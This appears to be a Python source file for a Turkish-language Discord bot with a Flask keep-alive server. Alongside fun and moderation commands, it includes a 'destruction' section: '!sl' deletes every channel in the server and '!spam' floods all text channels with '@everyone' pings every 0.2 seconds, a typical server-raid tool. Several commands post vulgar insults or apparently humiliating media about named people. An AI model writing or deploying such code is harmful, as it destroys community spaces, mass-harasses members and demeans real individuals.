import discord
from discord.ext import commands
import asyncio
import os
import random
from flask import Flask
from threading import Thread

# --- Flask Web Sunucusu (Render için) ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot aktif!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

# --- Discord Bot Ayarları ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# --- Global Değişkenler ---
spam_aktif = False
silme_aktif = False

# --- Bot Olayları ---
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="!yardım"))
    print(f'✅ Bot hazır: {bot.user}')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Yetkin yetmiyor, otur ağla.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Eksik argüman. Doğru kullanım: `{ctx.command.name} {ctx.command.signature}`")
    else:
        print(f"Hata: {error}")
        await ctx.send(f"❌ Hata: {str(error)[:100]}")

# --- KOMUTLAR ---

# 1. Kanal Silme (2 saniye arayla)
@bot.command()
@commands.has_permissions(administrator=True)
async def sl(ctx):
    global silme_aktif
    if silme_aktif:
        await ctx.send("⚠️ Zaten silme işlemi aktif.")
        return
    silme_aktif = True
    await ctx.send("🗑️ Tüm kanallar 2 saniye arayla siliniyor... (!sildur ile durdur)")
    for kanal in ctx.guild.channels:
        if not silme_aktif:
            break
        try:
            await kanal.delete()
            await asyncio.sleep(2)
        except Exception as e:
            print(f"Silme hatası: {e}")
    silme_aktif = False
    await ctx.send("✅ Kanallar silme işlemi tamamlandı veya durduruldu.")

@bot.command()
@commands.has_permissions(administrator=True)
async def sildur(ctx):
    global silme_aktif
    silme_aktif = False
    await ctx.send("🛑 Kanal silme durduruldu.")

# 2. Gelişmiş Spam (tüm kanallara aynı anda, hızlı)
@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("⚠️ Zaten spam aktif.")
        return
    spam_aktif = True
    await ctx.send("🔊 Spam başladı! (!dur ile durdur)")
    while spam_aktif:
        # Tüm kanallara aynı anda mesaj gönder
        tasks = []
        for kanal in ctx.guild.text_channels:
            tasks.append(kanal.send("KLOWINC BİR UGRADI! @everyone"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.2)  # 0.2 saniye bekle, seri gitsin
    await ctx.send("✅ Spam durduruldu.")

@bot.command()
@commands.has_permissions(administrator=True)
async def dur(ctx):
    global spam_aktif
    spam_aktif = False
    await ctx.send("🛑 Spam durduruldu.")

# 3. Eğlence Komutları

# !ship - İki kişi arasındaki aşk uyumu
@bot.command()
async def ship(ctx, kisi1: discord.Member, kisi2: discord.Member = None):
    if kisi2 is None:
        # Eğer ikinci kişi belirtilmezse bot rastgele bir üye seçer
        uyeler = [uye for uye in ctx.guild.members if not uye.bot and uye != kisi1]
        if not uyeler:
            await ctx.send("❌ Yeterli üye yok.")
            return
        kisi2 = random.choice(uyeler)
    
    uyum = random.randint(0, 100)
    kalp = "❤️" if uyum > 70 else "💖" if uyum > 40 else "💔"
    await ctx.send(f"💞 **{kisi1.display_name}** ve **{kisi2.display_name}** arasındaki aşk uyumu: **{uyum}%** {kalp}")

# !8ball - Sihirli 8 top
@bot.command()
async def eightball(ctx, *, soru):
    cevaplar = [
        "Evet", "Hayır", "Belki", "Kesinlikle", "Asla", 
        "Olabilir", "Şanslısın", "Denemeye değer", "Unut gitsin", 
        "Yarın tekrar sor", "Kesinlikle hayır", "Kesinlikle evet"
    ]
    await ctx.send(f"🎱 **{soru}** → {random.choice(cevaplar)}")

# !espri - Rastgele espri
@bot.command()
async def espri(ctx):
    espiriler = [
        "Bir gün bir bilgisayar virüsü hastaneye gitmiş. Doktor: 'Geçmiş olsun, sende antivirüs var!'",
        "Neden matematikçiler denizde yüzemez? Çünkü sinüsleri var.",
        "Bugün çok mutluyum, çünkü hayatımda ilk defa bir bot bana '!espri' dedi.",
        "İki programcı arasında geçen diyalog: 'Neden kodun çalışmıyor?' 'Bilmiyorum, belki de syntax hatası var.' 'Ya da belki senin beyninde bug var.'",
        "Bir inek, bir tavuk ve bir at konuşuyormuş. İnek: 'Ben süt veriyorum.' Tavuk: 'Ben yumurta veriyorum.' At: 'Ben de sosyal medyada 'harika' yorumları alıyorum.'"
    ]
    await ctx.send(random.choice(espiriler))

# !fbi - Açıl FBI
@bot.command()
async def fbi(ctx):
    await ctx.send("🚨 **FBI! AÇIL!** Eller yukarı! 📸")

# !avatar - Kullanıcının avatarını göster
@bot.command()
async def avatar(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    embed = discord.Embed(title=f"{member.display_name}'in avatarı")
    embed.set_image(url=member.avatar.url)
    await ctx.send(embed=embed)

# 4. Eski eğlence komutları (korundu)
@bot.command()
async def valdo(ctx):
    await ctx.send("YARRAMM VALDO BU KIM AMK")

@bot.command()
async def gonu(ctx):
    await ctx.send("2 GUNDE 48 CK ATAN ADAM")

@bot.command()
async def eternal(ctx):
    await ctx.send("FURKANIN NAMIDEGER BABASI")

@bot.command()
async def klowinc(ctx):
    await ctx.send("BU ADAMIN TASSAKLARINA BETON YETMEZ")

@bot.command()
async def doruk(ctx):
    await ctx.send("ARİEL BABAAAA")

# 5. Medya komutları (dosyalar aynı klasörde)
@bot.command()
async def atam(ctx):
    try:
        await ctx.send(file=discord.File('ataturk.jpg'))
    except FileNotFoundError:
        await ctx.send("❌ ataturk.jpg bulunamadı.")

@bot.command()
async def furkandomalma(ctx):
    try:
        await ctx.send(file=discord.File('furkandomalma.jpg'))
    except FileNotFoundError:
        await ctx.send("❌ furkandomalma.jpg bulunamadı.")

@bot.command()
async def furkanvideo(ctx):
    try:
        await ctx.send(file=discord.File('furkan.mp4'))
    except FileNotFoundError:
        await ctx.send("❌ furkan.mp4 bulunamadı.")

# 6. Moderasyon
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'👢 {member.name} sunucudan atıldı!')

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f'🔨 {member.name} banlandı!')

@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, miktar: int):
    if miktar < 1 or miktar > 1000:
        await ctx.send("❌ 1-1000 arası sayı girin.")
        return
    await ctx.channel.purge(limit=miktar+1)
    await ctx.send(f'🗑️ {miktar} mesaj silindi.', delete_after=3)

# 7. Yardım (güncellendi)
@bot.command()
async def yardım(ctx):
    embed = discord.Embed(
        title="📋 Komut Listesi",
        description="Bot komutları",
        color=discord.Color.blue()
    )
    embed.add_field(name="⚠️ Yıkım", value="`!sl` (kanalları sil), `!sildur` (durdur)\n`!spam` (spam başlat), `!dur` (durdur)", inline=False)
    embed.add_field(name="😂 Eğlence", value="`!valdo`, `!gonu`, `!eternal`, `!klowinc`, `!doruk`", inline=False)
    embed.add_field(name="💞 Yeni Eğlence", value="`!ship @kullanıcı1 @kullanıcı2`\n`!8ball <soru>`\n`!espri`\n`!fbi`\n`!avatar @kullanıcı`", inline=False)
    embed.add_field(name="🖼️ Medya", value="`!atam`, `!furkandomalma`, `!furkanvideo`", inline=False)
    embed.add_field(name="🔨 Moderasyon", value="`!kick @kullanıcı`, `!ban @kullanıcı`, `!clear <sayı>`", inline=False)
    embed.set_footer(text="Herhangi bir sorunda yöneticiye başvur.")
    await ctx.send(embed=embed)

# --- BAŞLATMA ---
if __name__ == "__main__":
    Thread(target=run_web).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("❌ DISCORD_TOKEN ayarlanmamış!")